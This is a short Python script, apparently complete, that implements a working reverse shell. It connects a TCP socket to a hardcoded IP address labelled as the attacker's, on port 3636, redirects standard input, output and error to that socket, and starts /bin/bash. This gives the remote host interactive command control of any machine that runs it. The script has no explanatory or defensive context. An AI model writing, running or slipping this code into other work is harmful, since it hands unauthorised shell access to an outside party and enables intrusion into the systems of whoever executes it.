import socket
import os
import subprocess

# Configure attacker IP and port
ATTACKER_IP = "36.85.54.238"
PORT = 3636

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ATTACKER_IP, PORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash"])
